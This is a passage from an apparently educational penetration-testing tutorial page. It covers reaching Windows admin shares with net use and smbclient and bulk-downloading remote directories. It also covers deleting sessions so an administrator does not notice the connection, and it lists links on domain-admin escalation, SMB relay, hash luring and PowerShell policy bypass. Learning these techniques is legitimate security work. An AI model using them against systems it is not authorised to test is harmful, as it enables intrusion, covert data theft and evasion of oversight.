-------------------------------------------------------------------------------
OK                     \\DC.xxxxxxxx.net\IPC$   Microsoft Windows Network
The command completed successfully.
</pre></div>
</div>
<p>However, if administrator on DC.xxxxx.net runs a net session command, the connections would be detected. For that issue</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>net use /delete *
</pre></div>
</div>
<p>On windows, after running this, if we execute</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>//IPAddress/C$
</pre></div>
</div>
<p>we should be able to view the directory via windows explorer.</p>
</div>
<div class="section" id="linux">
<h4>Linux<a class="headerlink" href="#linux" title="Permalink to this headline">¶</a></h4>
<p>smbclient: We can use smbclient to access the remote computer file-system.</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>smbclient -L hostname -U domainname\\username

-L|--list This option allows you to look at what services are available on a server. You use it as smbclient -L host and a list should appear. The -I option may be useful if your NetBIOS names don&#39;t match your TCP/IP DNS host names or if you are trying to reach a host on another network.
</pre></div>
</div>
<p>The below will drop you in to command line</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>smbclient \\\\hostname\\C$ -U domainname\\username
(After entering the password)

smb: \&gt; ls
smb: \&gt; ls
$Recycle.Bin                      DHS        0  Wed Nov 30 20:00:40 2016
.rnd                                A     1024  Mon Jul 27 13:51:24 2015
Boot                              DHS        0  Mon Jul 27 14:16:53 2015
bootmgr                          AHSR   333257  Sat Apr 11 21:42:12 2009
BOOTSECT.BAK                      ASR     8192  Wed Jul 21 09:01:52 2010
Certificate                         D        0  Sun Jun 23 17:20:48 2013
Config.Msi                        DHS        0  Thu Feb 16 01:49:59 2017
cpqsprt.trace                       A     8004  Wed Jul 21 08:59:57 2010
cpqsystem                           D        0  Wed Jul 21 08:32:58 2010
csv.err                             A       90  Sun May 20 15:35:38 2012
csv.log                             A      278  Sun May 20 15:35:38 2012
Documents and Settings            DHS        0  Sat Jan 19 19:53:20 2008
Program Files                      DR        0  Thu Sep  8 16:24:36 2016
Program Files (x86)                DR        0  Tue Nov 22 21:28:01 2016
ProgramData                        DH        0  Thu Feb  9 16:51:52 2017
Rename.bat                          A     1406  Wed Oct 26 15:11:19 2011
System Volume Information         DHS        0  Thu Feb 16 01:49:56 2017
temp                                D        0  Fri Aug  9 17:16:55 2013
Users                              DR        0  Wed Nov 30 20:00:08 2016
Windows                             D        0  Wed Feb 15 23:18:12 2017
</pre></div>
</div>
<p><strong>Recursively download a directory using smbclient?</strong></p>
<div class="highlight-None"><div class="highlight"><pre><span></span>smbclient &#39;\\server\share&#39;
mask &quot;&quot;
recurse ON
prompt OFF
cd &#39;path\to\remote\dir&#39;
lcd &#39;~/path/to/download/to/&#39;
mget *
</pre></div>
</div>
<p>or mount the share directly</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>mount -t cifs -o username=&lt;share user&gt;,password=&lt;share password&gt;,domain=example.com //WIN_PC_IP/&lt;share name&gt; /mnt
</pre></div>
</div>
</div>
</div>
</div>
<div class="section" id="appendix-i-interesting-stories">
<span id="id20"></span><h2>Appendix-I : Interesting Stories<a class="headerlink" href="#appendix-i-interesting-stories" title="Permalink to this headline">¶</a></h2>
<div class="section" id="targeting-domain-administrator">
<h3>Targeting Domain Administrator!<a class="headerlink" href="#targeting-domain-administrator" title="Permalink to this headline">¶</a></h3>
<ul class="simple">
<li>RastaMouse talks about his experiences in a blog on <a class="reference external" href="https://rastamouse.me/2017/06/psexec-much/">PSExec Much?</a> Here he starts with a domain user and make his way to Domain Administrator account utilizing Powerview/ Invoke-LoginPrompt.</li>
<li>Sean Metcalf has written a awesome blog on <a class="reference external" href="https://adsecurity.org/?p=2362">Attack Methods for Gaining Domain Admin Rights in Active Directory</a></li>
<li>Fuzzy Security has written a amazing blog showing the journey of Local Administrator to a Domain User to Domain Administrator in his blog <a class="reference external" href="http://www.fuzzysecurity.com/tutorials/25.html">Windows Domains, Pivot &amp; Profit</a></li>
<li>Nikhil SamratAshok Mittal has written a blog on <a class="reference external" href="http://www.labofapenetrationtester.com/2016/02/getting-domain-admin-with-kerberos-unconstrained-delegation.html">Getting Domain Admin with Kerberos Unconstrained Delegation</a> Sean Metcalf has written <a class="reference external" href="https://adsecurity.org/?p=1667">Active Directory Security Risk #101: Kerberos Unconstrained Delegation (or How Compromise of a Single Server Can Compromise the Domain)</a></li>
</ul>
</div>
<div class="section" id="others">
<h3>Others<a class="headerlink" href="#others" title="Permalink to this headline">¶</a></h3>
<ul class="simple">
<li>Identify High Risk Windows Assets : Scott Sutherland writes a powershell way and <a class="reference external" href="https://blog.netspi.com/a-faster-way-to-identify-high-risk-windows-assets">A Faster Way to Identify High Risk Windows Assets</a> Active Directory stores the operating system version and service pack level for every Windows system associated with the domain.  The information can be used during penetration tests to target systems missing patches like MS08-67, or identification of high risk assets.</li>
<li><a class="reference external" href="https://github.com/GDSSecurity/Windows-Exploit-Suggester">Windows Exploit Suggestor</a> tool compares a targets patch levels against the Microsoft vulnerability database in order to detect potential missing patches on the target. It also notifies the user if there are public exploits and Metasploit modules available for the missing bulletins.</li>
</ul>
<div class="section" id="smbrelay">
<h4>SMBRelay<a class="headerlink" href="#smbrelay" title="Permalink to this headline">¶</a></h4>
<ul class="simple">
<li>Scott Sutherland has written <a class="reference external" href="https://blog.netspi.com/executing-smb-relay-attacks-via-sql-server-using-metasploit/">Executing SMB Relay Attacks via SQL Server using Metasploit</a></li>
<li>To lure the victim, so that they give their hashes for cracking/ relaying Karl Fosaaen has written a blog on <a class="reference external" href="https://blog.netspi.com/10-places-to-stick-your-unc-path/">10 Places to Stick Your UNC Path</a></li>
<li>By default PowerShell is configured to prevent the execution of PowerShell scripts on Windows systems which can be a hurdle for penetration testers, sysadmins, and developers. Scott Sutherland has written <a class="reference external" href="https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/">15 Ways to Bypass the PowerShell Execution Policy</a></li>
</ul>
</div>
<div class="section" id="windows-privilege-escalation">
<h4>Windows Privilege Escalation<a class="headerlink" href="#windows-privilege-escalation" title="Permalink to this headline">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://blog.netspi.com/windows-privilege-escalation-part-1-local-administrator-privileges/">Windows Privilege Escalation Part 1: Local Administrator Privileges</a></li>
<li><a class="reference external" href="https://blog.netspi.com/windows-privilege-escalation-part-2-domain-admin-privileges/">Windows Privilege Escalation Part 2: Domain Admin Privileges</a></li>
<li><a class="reference external" href="https://blog.netspi.com/5-ways-to-find-systems-running-domain-admin-processes/">5 Ways to Find Systems Running Domain Admin Processes</a></li>
</ul>
</div>
</div>
</div>
<div class="section" id="changelog">
<h2>Changelog<a class="headerlink" href="#changelog" title="Permalink to this headline">¶</a></h2>
<ul>
<li><strong class="first">Minor correction; Indent</strong><span> by </span><em>bitvijays</em></li>
<li><strong class="first">Added Updates in BinaryExploitation, Forensics, Linus Essentials, Exploitation, PostExploitation</strong><span> by </span><em>bitvijays</em></li>
</ul>
<div data-disqus-identifier="Infrastructure PenTest Series : Part 3 - Exploitation" data-disqus-shortname="techbitvijays" id="disqus_thread"></div></div>
</div>


          </div>
        </div>
      </div>
      <div class="clearer"></div>
    </div>
    <div class="related" role="navigation" aria-label="related navigation">
      <h3>Navigation</h3>
      <ul>
        <li class="nav-item nav-item-0"><a href="index.html">tech.bitvijays.com</a> &#187;</li> 
      </ul>
    </div>
    <div class="footer" role="contentinfo">
        &#169; Copyright 2017, Vijay Kumar.
    </div>
  </body>
</html>